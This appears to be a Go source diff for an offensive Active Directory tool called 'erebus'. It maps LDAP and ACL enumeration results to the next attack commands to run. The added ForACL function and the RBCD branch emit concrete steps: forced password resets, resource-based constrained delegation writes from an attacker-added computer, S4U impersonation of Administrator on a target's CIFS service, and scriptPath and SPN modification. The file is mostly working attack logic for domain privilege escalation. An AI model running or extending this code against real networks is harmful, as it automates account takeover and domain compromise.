@@ -31,10 +31,16 @@ func ForLDAPEnum(r *pb.LDAPEnumResult) []string {
 			out = append(out, "ldap_enum query_type=asrep_roastable")
 		case "asrep_roastable":
 			out = append(out, "ldap_enum query_type=users")
+		case "acl":
+			out = append(out, "host: erebus ldap enum --type interesting", "host: erebus ldap enum --type rbcd")
 		default:
 			out = append(out, "ldap_enum query_type=kerberoastable", "ldap_enum query_type=shadow", "ldap_enum query_type=rbcd")
 		}
 		return Cap(out)
+	}
+
+	if qt == "acl" {
+		return ForACL(r)
 	}
 
 	switch qt {
@@ -103,23 +109,30 @@ func ForLDAPEnum(r *pb.LDAPEnumResult) []string {
 		}
 		out = append(out, fmt.Sprintf("ldap_enum query_type=kerberoastable domain=%s target_dc=%s", r.Domain, r.Dc))
 	case "rbcd":
-		out = append(out, "rbcd write --to <HOST$> --from ATTACK$ (critical; addcomputer first)")
+		out = append(out, "msDS-AllowedToActOnBehalfOfOtherIdentity set — review who can act")
+		out = append(out, "host: erebus ad add-computer --name ATTACK --yes")
 		for i, e := range r.Entries {
 			if i >= 2 {
 				break
 			}
 			if sam := ldapAttr(e, "sAMAccountName"); sam != "" {
-				out = append(out, fmt.Sprintf("rbcd write --to %s --from ATTACK$ (critical)", sam))
+				out = append(out, fmt.Sprintf("host: erebus rbcd show --to %s", sam))
+				host := ldapAttr(e, "dNSHostName")
+				if host == "" || strings.HasSuffix(host, "$") {
+					out = append(out, "host: erebus kerberos s4u --impersonate Administrator --spn cifs/<fqdn> [--altservice CIFS/<other>]")
+				} else {
+					out = append(out, fmt.Sprintf("host: erebus kerberos s4u --impersonate Administrator --spn cifs/%s [--altservice CIFS/<other>]", host))
+				}
 			}
 		}
 	case "shadow":
-		out = append(out, "ad shadow write (critical; KeyCredentialLink already populated — review)")
+		out = append(out, "msDS-KeyCredentialLink populated — review (shadow write not shipped)")
 		for i, e := range r.Entries {
 			if i >= 2 {
 				break
 			}
 			if sam := ldapAttr(e, "sAMAccountName"); sam != "" {
-				out = append(out, fmt.Sprintf("ad shadow write --target %s (critical)", sam))
+				out = append(out, fmt.Sprintf("review KeyCredentialLink on %s", sam))
 			}
 		}
 	case "computers":
@@ -141,6 +154,76 @@ func ForLDAPEnum(r *pb.LDAPEnumResult) []string {
 	}
 
 	return Cap(out)
+}
+
+// ForACL names the next host verb from parsed DACL findings (not "review BloodHound").
+func ForACL(r *pb.LDAPEnumResult) []string {
+	if r == nil {
+		return nil
+	}
+	if r.TotalResults == 0 && len(r.Entries) == 0 {
+		return Cap([]string{
+			"host: erebus ldap enum --type interesting",
+			"host: erebus ldap enum --type rbcd",
+		})
+	}
+	var out []string
+	seen := map[string]bool{}
+	add := func(s string) {
+		if s == "" || seen[s] {
+			return
+		}
+		seen[s] = true
+		out = append(out, s)
+	}
+	for _, e := range r.Entries {
+		if e == nil {
+			continue
+		}
+		sam := ldapAttr(e, "sAMAccountName")
+		if sam == "" {
+			continue
+		}
+		cat := strings.ToLower(ldapAttr(e, "objectCategory"))
+		rights := ldapAll(e, "rights")
+		has := func(name string) bool {
+			for _, r := range rights {
+				if strings.EqualFold(r, name) {
+					return true
+				}
+			}
+			return false
+		}
+		if has("ForceChangePassword") {
+			add(fmt.Sprintf("host: erebus ad password --target %s --new-pass-file ./new.txt --yes", sam))
+		}
+		if has("AllowedToAct") || ((has("GenericAll") || has("WriteDacl")) && strings.Contains(cat, "computer")) {
+			add(fmt.Sprintf("host: erebus rbcd write --to %s --from ATTACK$", sam))
+		}
+		if (has("GenericAll") || has("GenericWrite")) && (cat == "" || strings.Contains(cat, "user") || strings.Contains(cat, "person")) {
+			add(fmt.Sprintf("host: erebus ldap set %s scriptPath <value>", sam))
+			add(fmt.Sprintf("host: erebus ad password --target %s --new-pass-file ./new.txt --yes", sam))
+		}
+		if (has("GenericAll") || has("GenericWrite") || has("WriteSPN")) && strings.Contains(cat, "computer") {
+			add(fmt.Sprintf("host: erebus ldap set --target %s servicePrincipalName <SPN> --yes", sam))
+		}
+	}
+	if len(out) == 0 {
+		add("host: erebus ldap enum --type interesting")
+	}
+	return Cap(out)
+}
+
+func ldapAll(e *pb.LDAPEntry, name string) []string {
+	if e == nil || e.Attributes == nil {
+		return nil
+	}
+	for k, v := range e.Attributes {
+		if strings.EqualFold(k, name) && v != nil {
+			return v.Values
+		}
+	}
+	return nil
 }
 
 // ForSMB derives follow-on actions from remote SMB client results.
